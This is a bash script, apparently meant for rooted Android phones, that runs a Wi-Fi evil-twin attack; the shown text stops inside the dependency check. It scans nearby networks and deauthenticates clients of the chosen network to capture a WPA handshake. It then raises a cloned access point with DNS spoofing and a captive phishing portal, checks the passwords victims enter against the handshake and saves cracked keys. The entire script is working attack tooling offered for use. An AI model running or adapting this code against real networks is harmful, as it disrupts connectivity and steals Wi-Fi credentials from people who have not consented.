#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${GREEN}[*]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[!]${NC} $1"; }
log_error() { echo -e "${RED}[-]${NC} $1"; }
log_success() { echo -e "${GREEN}[✓]${NC} $1"; }

TARGET_BSSID=""
TARGET_SSID=""
TARGET_CHANNEL=""
FAKE_SSID=""
HANDSHAKE_FILE=""
DEAUTH_PID=""
MON_INTERFACE=""
AP_INTERFACE="wlan2"
INTERNET_INTERFACE=""
SELECTED_INTERFACE=""
ORIGINAL_CON_MODE=""  # Store original ICNSS con_mode

detect_device() {
    local hostname="$1"
    local mac="$2"
    
    if [ -n "$hostname" ] && [ "$hostname" != "*" ]; then
        hostname_lower=$(echo "$hostname" | tr '[:upper:]' '[:lower:]')
        
        if echo "$hostname_lower" | grep -q "desktop-\|win-\|pc-\|windows\|laptop\|notebook"; then
            echo "Windows"
            return
        fi
        
        if echo "$hostname_lower" | grep -q "iphone\|ipad\|ipod\|macbook\|mac-"; then
            echo "Apple"
            return
        fi
        
        if echo "$hostname_lower" | grep -q "android\|galaxy\|sm-"; then
            echo "Android"
            return
        fi
        
        if echo "$hostname_lower" | grep -q "linux\|ubuntu\|kali\|raspberry"; then
            echo "Linux"
            return
        fi
    fi
    
    echo "Unknown"
}

get_monitor_interface() {
    local selected_iface="$SELECTED_INTERFACE"
    
    local mon_iface=$(iw dev 2>/dev/null | awk '/Interface/ {iface=$2} /type monitor/ {print iface}' | head -1)
    if [ -n "$mon_iface" ]; then
        echo "$mon_iface"
        return
    fi
    
    for suffix in "mon" "_mon" ""; do
        check_iface="${selected_iface}${suffix}"
        if iw dev 2>/dev/null | grep -q "Interface $check_iface"; then
            echo "$check_iface"
            return
        fi
    done
    
    for iface in mon0 mon1; do
        if iw dev 2>/dev/null | grep -q "Interface $iface"; then
            echo "$iface"
            return
        fi
    done
    
    if iw dev "$selected_iface" info 2>/dev/null | grep -q "type monitor"; then
        echo "$selected_iface"
        return
    fi
    
    echo ""
}

# New function for ICNSS monitor mode
enable_icnss_monitor() {
    local interface="$1"
    local con_mode_path="/sys/module/wlan/parameters/con_mode"
    
    log_info "Attempting ICNSS monitor mode on $interface..."
    
    # Check if con_mode file exists
    if [ ! -f "$con_mode_path" ]; then
        log_error "ICNSS con_mode file not found at $con_mode_path"
        return 1
    fi
    
    # Save original mode for cleanup
    ORIGINAL_CON_MODE=$(cat "$con_mode_path" 2>/dev/null)
    log_info "Original con_mode: $ORIGINAL_CON_MODE"
    
    # Take interface down
    ip link set "$interface" down 2>/dev/null
    
    # Set monitor mode (4 = monitor)
    echo "4" > "$con_mode_path" 2>/dev/null
    if [ $? -ne 0 ]; then
        log_error "Failed to set con_mode to 4"
        ip link set "$interface" up 2>/dev/null
        return 1
    fi
    
    # Bring interface up
    ip link set "$interface" up 2>/dev/null
    sleep 2
    
    # Verify monitor mode
    if iw dev "$interface" info 2>/dev/null | grep -q "type monitor"; then
        log_success "ICNSS monitor mode enabled on $interface (con_mode=4)"
        echo "$interface"
        return 0
    else
        log_error "Failed to verify monitor mode on $interface"
        return 1
    fi
}

cleanup() {
    echo ""
    log_info "Shutting down attack..."
    
    # Kill processes
    pkill -f hostapd 2>/dev/null
    pkill -f dnsmasq 2>/dev/null
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    pkill -f "php -S" 2>/dev/null
    pkill -f passapi.py 2>/dev/null
    fuser -k 5000/tcp 2>/dev/null
    fuser -k 80/tcp 2>/dev/null
    [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
    [ -n "$AP_INTERFACE" ] && iw dev "$AP_INTERFACE" del > /dev/null 2>&1
    
    # Restore ICNSS original con_mode if it was changed
    if [ -n "$ORIGINAL_CON_MODE" ] && [ -f "/sys/module/wlan/parameters/con_mode" ]; then
        log_info "Restoring ICNSS con_mode to $ORIGINAL_CON_MODE"
        echo "$ORIGINAL_CON_MODE" > /sys/module/wlan/parameters/con_mode 2>/dev/null
    fi
    
    # Note for user to manually stop monitor mode
    log_warn "Monitor mode may still be enabled on your interfaces."
    log_warn "To disable monitor mode manually, use: airmon-ng stop <interface>"
    log_warn "Or restart your WiFi with: svc wifi disable && svc wifi enable"
    
    # iptables restore
    if [ -f /sdcard/original ]; then
        log_info "Restoring iptables from /sdcard/original"
        iptables-restore < /sdcard/original
        log_success "Iptables restored successfully"
    fi
    
    # iptables cleanup (your existing code)
    while iptables -t nat -D PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80 2>/dev/null; do
        :
    done
    while iptables -t nat -D POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE 2>/dev/null; do
        :
    done
    iptables -D FORWARD -i "$AP_INTERFACE" -j ACCEPT 2>/dev/null || true
    
    while ip rule del pref 1 2>/dev/null; do
        :
    done
    while ip rule del pref 11000 2>/dev/null; do
        :
    done
    while ip rule del pref 17000 2>/dev/null; do
        :
    done
    while ip rule del pref 21000 2>/dev/null; do
        :
    done
    
    log_info "Cleaning up temporary files..."
    rm -f evil-*.cap evil-*.csv evil-*.kismet.* evil-*.netxml
    rm -f /tmp/target_bssid.txt /tmp/target_channel.txt /tmp/target_ssid.txt 
    rm -f /tmp/scan* /tmp/airodump.log /tmp/deauth.log
    rm -f nohup.out
    rm -f *.pcap
    rm -f attempts.txt password.txt
    rm -f /tmp/hostapd.log
    rm -f /tmp/dnsmasq.log
    rm -f /tmp/shown_connections.txt 
    rm -f /tmp/shown_disconnections.txt
    rm -f /tmp/connection_cache.txt
    rm -f /tmp/dns_shown_macs.txt
    rm -f /tmp/dhcp_shown.txt
    if [ -n "$HANDSHAKE_FILE" ] && [ -f "$HANDSHAKE_FILE" ]; then
        rm -f "$HANDSHAKE_FILE"
    fi
    if [ -n "$TARGET_SSID" ]; then
        SAFE_SSID=$(echo "$TARGET_SSID" | sed 's/[^a-zA-Z0-9]/_/g')
        rm -f "${SAFE_SSID}.cap"
    fi
    rm -f *.pid
    log_success "Cleanup complete"
    log_warn "Remember to manually disable monitor mode if needed!"
    exit 0
}
trap cleanup SIGINT SIGTERM EXIT

get_usb_device_info() {
    local iface="$1"
    wireless_devices=$(lsusb | grep -i "wireless\\|network\\|wlan\\|mediatek\\|mt76\\|mt760\\|rtl\\|realtek\\|cypress\\|atheros\\|qualcomm\\|ralink\\|intel\\|broadcom" | grep -v "root hub")
    if [ -n "$wireless_devices" ]; then
        device_name=$(echo "$wireless_devices" | head -1 | sed 's/^.*ID [0-9a-f:]\+ //')
        echo "$device_name"
    else
        device_name=$(lsusb | grep -v "root hub" | tail -1 | sed 's/^.*ID [0-9a-f:]\+ //')
        echo "${device_name:-External USB Adapter}"
    fi
}

get_pci_device_info() {
    local iface="$1"
    if command -v lspci >/dev/null 2>&1; then
        pci_addr=$(basename $(readlink /sys/class/net/$iface/device) 2>/dev/null)
        if [ -n "$pci_addr" ]; then
            lspci_output=$(lspci -s "$pci_addr" 2>/dev/null)
            if [ -n "$lspci_output" ]; then
                echo "$lspci_output" | sed 's/^[0-9a-f:]\+ //'
                return
            fi
        fi
    fi
    echo "Unknown PCI device"
}

select_adapter() {
    log_info "Scanning for wireless adapters..."
    interfaces=($(iw dev 2>/dev/null | grep "Interface" | awk '{print $2}'))
    if [ ${#interfaces[@]} -eq 0 ]; then
        log_error "No wireless interfaces found"
        exit 1
    fi
    declare -A adapter_map
    counter=1
    echo "Interface     PHY    Driver       Device"
    echo "========================================================"
    for iface in "${interfaces[@]}"; do
        phy=$(iw dev "$iface" info 2>/dev/null | grep "wiphy" | awk '{print "phy"$2}')
        driver=""
        if command -v ethtool >/dev/null 2>&1; then
            driver=$(ethtool -i "$iface" 2>/dev/null | grep "driver:" | cut -d: -f2 | sed 's/^[[:space:]]*//')
        fi
        if [ -z "$driver" ] && [ -d "/sys/class/net/$iface/device/driver" ]; then
            driver=$(basename $(readlink /sys/class/net/$iface/device/driver) 2>/dev/null)
        fi
        chipset="Unknown"
        if [ -d "/sys/class/net/$iface/device" ]; then
            device_path=$(readlink -f "/sys/class/net/$iface/device" 2>/dev/null)
            driver_path=$(readlink -f "/sys/class/net/$iface/device/driver" 2>/dev/null)
            if echo "$device_path" | grep -q "/usb" || echo "$driver_path" | grep -q "/usb"; then
                chipset=$(get_usb_device_info "$iface")
            elif echo "$device_path" | grep -q "/pci" || echo "$driver_path" | grep -q "/pci"; then
                chipset=$(get_pci_device_info "$iface")
            else
                chipset="Built-in"
            fi
        else
            chipset="Virtual"
        fi
        display_iface="$iface"
        if [ ${#iface} -gt 10 ]; then
            display_iface="${iface:0:9}~"
        fi
        display_chipset="$chipset"
        if [ ${#chipset} -gt 25 ]; then
            display_chipset="${chipset:0:24}~"
        fi
        adapter_map[$counter]="$iface"
        printf " ${GREEN}%2d.${NC} %-11s %-6s %-12s %s\n" "$counter" "$display_iface" "$phy" "$driver" "$display_chipset"
        ((counter++))
    done
    echo "========================================================"
    physical_count=0
    for iface in "${interfaces[@]}"; do
        if [ -d "/sys/class/net/$iface/device" ]; then
            ((physical_count++))
        fi
    done
    if [ $physical_count -eq 1 ]; then
        for iface in "${interfaces[@]}"; do
            if [ -d "/sys/class/net/$iface/device" ]; then
                SELECTED_INTERFACE="$iface"
                log_info "Auto-selected: $SELECTED_INTERFACE"
                return 0
            fi
        done
    fi
    while true; do
        read -p "Select interface (1-$((counter-1))): " selection
        if [[ "$selection" =~ ^[0-9]+$ ]] && [ "$selection" -ge 1 ] && [ "$selection" -le $((counter-1)) ]; then
            SELECTED_INTERFACE="${adapter_map[$selection]}"
            break
        else
            log_error "Invalid selection"
        fi
    done
}   

scan_networks() {
    log_info "Scanning for networks..."
    if [ -z "$SELECTED_INTERFACE" ]; then
        log_error "No interface selected!"
        exit 1
    fi
    
    log_info "Setting $SELECTED_INTERFACE to monitor mode..."
    
    # Check if this is an ICNSS interface (built-in phone WiFi)
    local driver=""
    if command -v ethtool >/dev/null 2>&1; then
        driver=$(ethtool -i "$SELECTED_INTERFACE" 2>/dev/null | grep "driver:" | cut -d: -f2 | sed 's/^[[:space:]]*//')
    fi
    
    if [[ "$driver" == "icnss" || "$driver" == "icnss2" ]]; then
        log_info "ICNSS driver detected, using special method..."
        MON_INTERFACE=$(enable_icnss_monitor "$SELECTED_INTERFACE")
        if [ -z "$MON_INTERFACE" ]; then
            log_error "Failed to enable ICNSS monitor mode!"
            exit 1
        fi
    else
        # Standard method for normal drivers
        ifconfig "$SELECTED_INTERFACE" down 2>/dev/null
        iw dev "$SELECTED_INTERFACE" set type monitor 2>/dev/null
        ifconfig "$SELECTED_INTERFACE" up 2>/dev/null
        sleep 2
        
        MON_INTERFACE=$(get_monitor_interface)
        if [ -z "$MON_INTERFACE" ]; then
            log_error "Failed to detect monitor interface!"
            exit 1
        fi
        
        if ! iw dev "$MON_INTERFACE" info 2>/dev/null | grep -q "type monitor"; then
            log_error "$MON_INTERFACE is not in monitor mode!"
            exit 1
        fi
    fi
    
    log_success "Using monitor interface: $MON_INTERFACE"
    log_info "Scanning for 20 seconds..."
    { timeout --signal=KILL 20 airodump-ng $MON_INTERFACE --output-format csv -w /tmp/scan > /dev/null 2>&1; } 2>/dev/null || true
    if [ ! -f "/tmp/scan-01.csv" ]; then
        log_error "No networks found"
        exit 1
    fi
    log_info "Available networks:"
    echo "----------------------------------------"
    counter=1
    declare -A network_map
    in_ap_section=true
    while IFS= read -r line; do
        [[ -z "$line" ]] && continue
        if [[ "$line" == "Station MAC"* ]]; then
            in_ap_section=false
            continue
        fi
        if [ "$in_ap_section" = true ] && [[ "$line" != "BSSID"* ]]; then
            bssid=$(echo "$line" | cut -d, -f1 | xargs)
            channel=$(echo "$line" | cut -d, -f4 | xargs)
            essid=$(echo "$line" | cut -d, -f14 | xargs)
            if [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && [[ -n "$essid" ]]; then
                network_map[$counter]="$bssid|$channel|$essid"
                printf " ${GREEN}%2d.${NC} %-25s [Ch %s]\n" "$counter" "$essid" "$channel"
                ((counter++))
            fi
        fi
    done < /tmp/scan-01.csv
    echo "----------------------------------------"
    if [ $counter -eq 1 ]; then
        log_error "No networks detected"
        exit 1
    fi
    read -p "Select target (1-$((counter-1))): " selection
    if [[ ! "$selection" =~ ^[0-9]+$ ]] || [ "$selection" -lt 1 ] || [ "$selection" -ge $counter ]; then
        log_error "Invalid selection"
        exit 1
    fi
    IFS='|' read -r TARGET_BSSID TARGET_CHANNEL TARGET_SSID <<< "${network_map[$selection]}"
    TARGET_BSSID=$(echo "$TARGET_BSSID" | xargs)
    TARGET_CHANNEL=$(echo "$TARGET_CHANNEL" | xargs)
    TARGET_SSID=$(echo "$TARGET_SSID" | xargs)
    FAKE_SSID="$TARGET_SSID"
    log_success "Target: $TARGET_SSID (${TARGET_BSSID:0:8}...) on channel $TARGET_CHANNEL"
}

capture_handshake() {
    local bssid="$1"
    local channel="$2"
    local ssid="$3"
    log_info "Capturing handshake for $ssid on channel $channel..."
    
    # Clean old capture files
    rm -f evil-*.cap /tmp/handshake_check.cap 2>/dev/null
    
    # Use iw instead of iwconfig
    iw dev $MON_INTERFACE set channel "$channel" 2>/dev/null
    sleep 2
    
    nohup sudo airodump-ng -c "$channel" --bssid "$bssid" -w evil $MON_INTERFACE > /tmp/airodump.log 2>&1 &
    AIRODUMP_PID=$!
    sleep 3
    
    nohup sudo aireplay-ng -0 0 -a "$bssid" $MON_INTERFACE > /tmp/deauth.log 2>&1 &
    DEAUTH_PID=$!
    log_info "Deauth running - waiting for handshake (max 60 seconds)..."
    
    HANDSAKE_CAPTURED=false
    
    # Wait for capture file to be created
    for i in {1..10}; do
        if [ -f "evil-01.cap" ]; then
            log_info "Capture file created"
            break
        fi
        sleep 1
    done
    
    # Check for handshake using temp file (fixes corruption issue)
    for i in {1..60}; do
        if [ -f "evil-01.cap" ]; then
            # Copy to temp file to avoid reading live file
            cp evil-01.cap /tmp/handshake_check.cap 2>/dev/null
            
            if aircrack-ng /tmp/handshake_check.cap 2>/dev/null | grep -q "1 handshake"; then
                log_success "Handshake captured!"
                HANDSAKE_CAPTURED=true
                rm -f /tmp/handshake_check.cap
                break
            fi
            rm -f /tmp/handshake_check.cap
        fi
        
        # Show progress every 10 seconds
        if [ $((i % 6)) -eq 0 ]; then
            echo -ne "\rWaiting for handshake... $((i/6 * 10)) seconds elapsed"
        fi
        sleep 10
    done
    echo ""  # New line after progress
    
    # Kill airodump
    sudo kill $AIRODUMP_PID 2>/dev/null
    sleep 2
    
    if [ "$HANDSAKE_CAPTURED" = true ]; then
        HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
        cp evil-01.cap "$HANDSHAKE_FILE"
        log_success "Handshake saved as: $HANDSHAKE_FILE"
        ls -la "$HANDSHAKE_FILE" | awk '{print "  Size: " $5 " bytes"}'
    else
        log_warn "No handshake captured after 60 seconds"
        read -p "Continue with evil twin attack anyway? (y/n): " choice
        if [[ ! "$choice" =~ ^[Yy]$ ]]; then
            [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
            exit 1
        fi
    fi
}

update_configs() {
    local bssid="$1"
    local channel="$2"
    local ssid="$3"
    log_info "Configuring attack..."
    HANDSHAKE_FILE="${ssid//[^a-zA-Z0-9]/_}.cap"
    if [ -f "passapi.py" ]; then
        sed -i "s/target = .*/target = '$bssid'/" passapi.py
        sed -i "s/ssid_name = .*/ssid_name = '$ssid'/" passapi.py
        sed -i "s/handshake_file = .*/handshake_file = '$HANDSHAKE_FILE'/" passapi.py
    else
        log_error "passapi.py not found!"
        exit 1
    fi
    if [ -f "hostapd.conf" ]; then
        sed -i "s/^ssid=.*/ssid=$ssid/" hostapd.conf
        sed -i "s/^channel=.*/channel=$channel/" hostapd.conf
        sed -i "s/^interface=.*/interface=$AP_INTERFACE/" hostapd.conf
    else
        log_error "hostapd.conf not found!"
        exit 1
    fi
    if [ -f "dnsmasq.conf" ]; then
        sed -i "s/^interface=.*/interface=$AP_INTERFACE/" dnsmasq.conf
    else
        log_error "dnsmasq.conf not found!"
        exit 1
    fi
}

select_interfaces() {
    echo "----------------------------------------"
    echo "AP Interface Selection:"
    echo " 1. wlan1"
    echo " 2. wlan2 (default)"
    echo " 3. wlan3"
    echo " 4. Custom name"
    echo "----------------------------------------"
    
    read -p "Select AP interface [1-4]: " ap_choice
    
    case $ap_choice in
        1) AP_INTERFACE="wlan1" ;;
        2) AP_INTERFACE="wlan2" ;;
        3) AP_INTERFACE="wlan3" ;;
        4) 
            read -p "Enter custom AP interface: " custom_ap
            AP_INTERFACE="${custom_ap:-wlan2}"
            ;;
        *) AP_INTERFACE="wlan2" ;;
    esac
    
    echo "----------------------------------------"
    echo "Internet Source:"
    echo " 1. WiFi (wlan0)"
    echo " 2. Cellular (rmnet_data2)"
    echo " 3. Custom interface"
    echo "----------------------------------------"
    
    read -p "Select internet source [1-3]: " internet_choice
    
    case $internet_choice in
        1) INTERNET_INTERFACE="wlan0" ;;
        2) INTERNET_INTERFACE="rmnet_data2" ;;
        3) 
            read -p "Enter custom internet interface: " custom_internet
            INTERNET_INTERFACE="${custom_internet:-wlan0}"
            ;;
        *) INTERNET_INTERFACE="wlan0" ;;
    esac
    
    log_success "AP Interface: $AP_INTERFACE"
    log_success "Internet Interface: $INTERNET_INTERFACE"
}

setup_internet_sharing() {
    log_info "Setting up internet sharing..."
    
    echo "Checking default rule number.."
    local table=""
    for table in $(ip rule list | awk -F"lookup" '{print $2}'); do
        DEF=$(ip route show table "$table" 2>/dev/null | grep default | grep "$INTERNET_INTERFACE")
        if ! [ -z "$DEF" ]; then
            break
        fi
    done
    echo "Default rule number is $table"
    
    echo "Checking for existing $AP_INTERFACE interface..."
    if ip link show "$AP_INTERFACE" 2>/dev/null; then
        echo "$AP_INTERFACE exists, continuing.."
    else
        if [[ $(iw list 2>/dev/null | grep '* AP') == *"* AP"* ]]; then
            echo "wlan0 supports AP mode, creating AP interface.."
            iw dev wlan0 interface add "$AP_INTERFACE" type __ap
            ip addr flush "$AP_INTERFACE"
            ip addr flush "$AP_INTERFACE"
            ip link set up dev "$AP_INTERFACE"
        else
            echo "wlan0 doesn't support AP mode, exiting.."
            exit 1
        fi
    fi
    
    echo "Adding iptables for internet sharing..."
    iptables --flush
    
    ifconfig "$AP_INTERFACE" up 10.0.0.1 netmask 255.255.255.0
    
    iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
    iptables --table nat --append POSTROUTING --out-interface "$INTERNET_INTERFACE" -j MASQUERADE
    iptables --append FORWARD --in-interface "$AP_INTERFACE" -j ACCEPT
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    ip rule add from all lookup main pref 1 2> /dev/null
    ip rule add from all iif lo oif "$AP_INTERFACE" uidrange 0-0 lookup 97 pref 11000 2>/dev/null
    ip rule add from all iif lo oif "$INTERNET_INTERFACE" lookup "$table" pref 17000 2>/dev/null
    ip rule add from all iif lo oif "$AP_INTERFACE" lookup 97 pref 17000 2>/dev/null
    ip rule add from all iif "$AP_INTERFACE" lookup "$table" pref 21000 2>/dev/null
    
    echo "Starting services..."
    sleep 5 && hostapd hostapd.conf 2>&1 | tee /tmp/hostapd.log > /dev/null 2>&1 &
    sleep 5
    dnsmasq -C dnsmasq.conf --log-dhcp -d > /tmp/dnsmasq.log 2>&1 &
    sleep 5
    dnsspoof -i "$AP_INTERFACE" > /dev/null 2>&1 &
}

start_evil_twin() {
    log_info "Starting evil twin..."
    setup_internet_sharing
    sleep 8
    python3 passapi.py > /dev/null 2>&1 &
    sleep 3
    cd portal
    php -S 10.0.0.1:80 router.php > /dev/null 2>&1 &
    cd ..
    sleep 8
    log_success "Evil twin is live"
}

monitor_attack() {
    local bssid="$1"
    log_info "Continuous deauth maintained from capture phase"
    echo "==============================="
    echo "ATTACK RUNNING"
    echo "==============================="
    echo "Target:    $TARGET_SSID"
    echo "Evil Twin: $FAKE_SSID" 
    echo "Channel:   $TARGET_CHANNEL"
    echo "AP Interface: $AP_INTERFACE"
    echo "Internet:  $INTERNET_INTERFACE"
    echo "Handshake: $HANDSHAKE_FILE"
    echo "Deauth:   $MON_INTERFACE"
    echo "----------------------------------------"
    echo "Monitoring connections & credentials..."
    echo "----------------------------------------"
    
    SHOWN_CONNECTIONS="/tmp/shown_connections.txt"
    SHOWN_DISCONNECTIONS="/tmp/shown_disconnections.txt"
    DHCP_SHOWN_FILE="/tmp/dhcp_shown.txt"
    CONNECTION_CACHE="/tmp/connection_cache.txt"
    DNS_SHOWN_MACS="/tmp/dns_shown_macs.txt"
    
    last_attempt_count=0
    password_found=false
    
    HOSTAPD_LOG_POS=0
    DNSMASQ_LOG_POS=0
    
    while true; do
        if [ -f "password.txt" ] && [ -s "password.txt" ]; then
            temp_pass=$(cat password.txt | head -1 | tr -d '[:space:]')
            if aircrack-ng "$HANDSHAKE_FILE" -b "$TARGET_BSSID" -w password.txt 2>/dev/null | grep -q "KEY FOUND"; then
                echo ""
                echo -e "${GREEN}PASSWORD CRACKED: $temp_pass${NC}"
                timestamp=$(date +"%Y-%m-d %H:%M:%S")
                echo "$timestamp | SSID: $TARGET_SSID | BSSID: $TARGET_BSSID | Password: $temp_pass" >> cracked.txt
                echo -e "${GREEN}Cracked Network Saved in: cracked.txt${NC}"
                echo ""
                [ -n "$DEAUTH_PID" ] && kill $DEAUTH_PID 2>/dev/null
                echo "Waiting 30 seconds before shutdown..."
                for i in {30..1}; do
                    echo -ne "Shutting down in: $i seconds\r"
                    sleep 1
                done
                echo ""
                echo -e "${GREEN}Attack completed successfully!${NC}"
                password_found=true
                break
            fi
        fi
        
        if [ -f "attempts.txt" ] && [ -s "attempts.txt" ]; then
            current_count=$(wc -l < attempts.txt 2>/dev/null)
            if [ $current_count -gt $last_attempt_count ]; then
                new_attempts=$(tail -n $((current_count - last_attempt_count)) attempts.txt 2>/dev/null)
                if [ ! -z "$new_attempts" ]; then
                    echo ""
                    echo "NEW PASSWORD ATTEMPTS:"
                    echo "$new_attempts" | while read -r line; do
                        if [ ! -z "$line" ]; then
                            echo "  $line"
                        fi
                    done
                    echo ""
                fi
                last_attempt_count=$current_count
            fi
        fi
        
        if [ -f "/tmp/hostapd.log" ]; then
            current_size=$(stat -c%s "/tmp/hostapd.log" 2>/dev/null || wc -c < "/tmp/hostapd.log")
            
            if [ $current_size -gt $HOSTAPD_LOG_POS ]; then
                tail -c +$((HOSTAPD_LOG_POS + 1)) "/tmp/hostapd.log" | while IFS= read -r log_line; do
                    
                    if echo "$log_line" | grep -q "AP-STA-CONNECTED"; then
                        mac=$(echo "$log_line" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}')
                        
                        if [ -n "$mac" ]; then
                            if ! grep -q "^$mac$" "$CONNECTION_CACHE" 2>/dev/null; then
                                echo "$mac" >> "$CONNECTION_CACHE"
                                
                                sleep 5
                                
                                hostname=""
                                ip=""
                                device_type="Unknown"
                                
                                if [ -f "/tmp/dnsmasq.log" ]; then
                                    hostname=$(grep "DHCPACK.*$mac" /tmp/dnsmasq.log 2>/dev/null | tail -1 | awk '{for(i=6;i<=NF;i++) if ($i !~ /^([0-9a-f]{2}:){5}[0-9a-f]{2}$/) {print $i; break}}')
                                    
                                    if [ -z "$hostname" ]; then
                                        hostname=$(grep "client provides name:.*$mac" /tmp/dnsmasq.log 2>/dev/null | tail -1 | awk '{print $NF}' | sed 's/"//g')
                                    fi
                                    
                                    ip=$(grep -E "DHCPACK.*$mac|DHCPOFFER.*$mac" /tmp/dnsmasq.log 2>/dev/null | tail -1 | awk '{print $4}')
                                    
                                    if [ -n "$ip" ]; then
                                        if tail -100 /tmp/dnsmasq.log 2>/dev/null | grep -q "query.*captive\.apple\.com.*$ip"; then
                                            device_type="Apple"
                                        elif tail -100 /tmp/dnsmasq.log 2>/dev/null | grep -q "query.*msftconnecttest\.com.*$ip"; then
                                            device_type="Windows"
                                        elif tail -100 /tmp/dnsmasq.log 2>/dev/null | grep -q "query.*connectivitycheck.*$ip"; then
                                            device_type="Android"
                                        fi
                                    fi
                                fi
                                
                                if [ "$device_type" = "Unknown" ] && [ -n "$hostname" ]; then
                                    device_type=$(detect_device "$hostname" "$mac")
                                fi
                                
                                if [ "$device_type" != "Unknown" ]; then
                                    if [ -n "$hostname" ] && [ "$hostname" != "*" ]; then
                                        echo -e "${GREEN}[+]${NC} $device_type connected: $mac ($hostname${ip:+, IP: $ip})"
                                    elif [ -n "$ip" ]; then
                                        echo -e "${GREEN}[+]${NC} $device_type connected: $mac (IP: $ip)"
                                    else
                                        echo -e "${GREEN}[+]${NC} $device_type connected: $mac"
                                    fi
                                else
                                    echo -e "${YELLOW}[!]${NC} Unknown device connected: $mac${ip:+, IP: $ip}"
                                fi
                            fi
                        fi
                    fi
                    
                    if echo "$log_line" | grep -q "AP-STA-DISCONNECTED"; then
                        mac=$(echo "$log_line" | grep -oE '([0-9a-f]{2}:){5}[0-9a-f]{2}')
                        
                        if [ -n "$mac" ]; then
                            sed -i "/^$mac$/d" "$CONNECTION_CACHE" 2>/dev/null
                            echo -e "${RED}[-]${NC} Device disconnected: $mac"
                        fi
                    fi
                    
                done
                
                HOSTAPD_LOG_POS=$current_size
            fi
        fi
        
        if [ -f "/tmp/dnsmasq.log" ]; then
            current_dns_size=$(stat -c%s "/tmp/dnsmasq.log" 2>/dev/null || wc -c < "/tmp/dnsmasq.log")
            
            if [ $current_dns_size -gt $DNSMASQ_LOG_POS ]; then
                
                tail -c +$((DNSMASQ_LOG_POS + 1)) "/tmp/dnsmasq.log" | while IFS= read -r dns_line; do
                    
                    if echo "$dns_line" | grep -q "vendor class:\|client provides name:"; then
                        clean_line=$(echo "$dns_line" | sed -n 's/.*\(query\[[^]]*\].*from [0-9.]*\).*/\1/p')
                        [ -z "$clean_line" ] && clean_line="$dns_line"
                        line_hash=$(echo "$clean_line" | md5sum | cut -d' ' -f1)
                        
                        if ! grep -q "$line_hash" "$DHCP_SHOWN_FILE" 2>/dev/null; then
                            mac=$(echo "$dns_line" | grep -o -E '([0-9a-f]{2}:){5}[0-9a-f]{2}')
                            
                            if [ -n "$mac" ]; then
                                echo "$line_hash" >> "$DHCP_SHOWN_FILE"
                                
                                if echo "$dns_line" | grep -q "vendor class:"; then
                                    vendor=$(echo "$dns_line" | sed -n 's/.*vendor class: \([^|]*\).*/\1/p')
                                    if [ -n "$vendor" ]; then
                                        if echo "$vendor" | grep -qi "MSFT"; then
                                            echo "[DHCP] Windows device: $mac (Vendor: $vendor)"
                                        elif echo "$vendor" | grep -qi "android"; then
                                            echo "[DHCP] Android device: $mac (Vendor: $vendor)"
                                        fi
                                    fi
                                fi
                                
                                if echo "$dns_line" | grep -q "client provides name:"; then
                                    hostname=$(echo "$dns_line" | awk -F'client provides name: ' '{print $2}' | awk '{print $1}')
                                    if [ -n "$hostname" ]; then
                                        echo "[DHCP] Hostname provided: $mac → $hostname"
                                    fi
                                fi
                            fi
                        fi
                    fi
                    
                    if echo "$dns_line" | grep -q "query\[.*captive\.apple\.com\|query\[.*msftconnecttest\.com\|query\[.*connectivitycheck\.android\.com"; then
                        clean_line=$(echo "$dns_line" | sed -n 's/.*\(query\[[^]]*\].*from [0-9.]*\).*/\1/p')
                        [ -z "$clean_line" ] && clean_line="$dns_line"
                        line_hash=$(echo "$clean_line" | md5sum | cut -d' ' -f1)
                        
                        if ! grep -q "$line_hash" "$DHCP_SHOWN_FILE" 2>/dev/null; then
                            ip=$(echo "$clean_line" | grep -o -E 'from [^ ]*' | awk '{print $2}')
                            
                            if [ -n "$ip" ]; then
                                mac=$(arp -n | grep "^$ip " | awk '{print $3}')
                                
                                if [ -n "$mac" ]; then
                                    echo "$line_hash" >> "$DHCP_SHOWN_FILE"
                                    
                                    if ! grep -q "^${mac}$" "$DNS_SHOWN_MACS" 2>/dev/null; then
                                        echo "${mac}" >> "$DNS_SHOWN_MACS"
                                        
                                        if echo "$clean_line" | grep -q "captive\.apple\.com"; then
                                            echo "[DNS] Apple device detected: $mac"
                                        elif echo "$clean_line" | grep -q "msftconnecttest\.com"; then
                                            echo "[DNS] Windows device detected: $mac"
                                        elif echo "$clean_line" | grep -q "connectivitycheck\.android\.com"; then
                                            echo "[DNS] Android device detected: $mac"
                                        fi
                                    fi
                                fi
                            fi
                        fi
                    fi
                    
                done
                
                DNSMASQ_LOG_POS=$current_dns_size
            fi
        fi
        
        sleep 3
    done
}

main() {
    echo "========================================"
    echo "      EVIL TWIN ATTACK"
    echo "========================================"
    if [ "$EUID" -ne 0 ]; then
        log_error "Run as root: sudo $0"
        exit 1
    fi
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    for cmd in aircrack-ng hostapd dnsmasq dnsspoof python3 php iw airmon-ng ethtool; do
        if command -v "$cmd" &>/dev/null; then
            echo -e "  ${GREEN}[✓]${NC} $cmd"
        else
            echo -e "  ${RED}[✗]${NC} $cmd"
            log_error "Missing: $cmd"
            case "$cmd" in
                "dnsspoof")
                    echo "  Install with: apt install dsniff"
                    ;;
                "aircrack-ng")
                    echo "  Install with: apt install aircrack-ng"
                    ;;
                "hostapd")
                    echo "  Install with: apt install hostapd"
                    ;;
                "dnsmasq")
                    echo "  Install with: apt install dnsmasq"
                    ;;
                "airmon-ng")
                    echo "  Install with: apt install aircrack-ng"
                    ;;
                "ethtool")
                    echo "  Install with: apt install ethtool"
                    ;;
                "php")
                    echo "  Install with: apt install php"
                    ;;
                "python3")
